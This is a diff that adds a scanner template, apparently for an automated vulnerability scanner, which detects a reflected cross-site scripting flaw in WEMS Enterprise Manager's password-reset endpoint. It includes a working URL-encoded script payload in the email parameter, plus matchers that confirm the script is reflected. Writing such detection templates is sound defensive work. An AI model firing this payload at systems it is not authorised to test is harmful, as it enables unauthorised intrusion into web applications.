@@ -1,0 +1,25 @@
+id: wems-manager-xss
+name: WEMS Enterprise Manager - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: WEMS Enterprise Manager contains a cross-site scripting vulnerability via the /guest/users/forgotten endpoint
+  and the email parameter, which allows a remote attacker to inject arbitrary JavaScript into the response return by the server.
+reference: CWE-79
+tags:
+- xss
+- packetstorm
+- vuln
+requests:
+- method: GET
+  path: /guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - '"><script>confirm(document.domain)</script>'
+  - type: header
+    words:
+    - text/html
+  condition: and
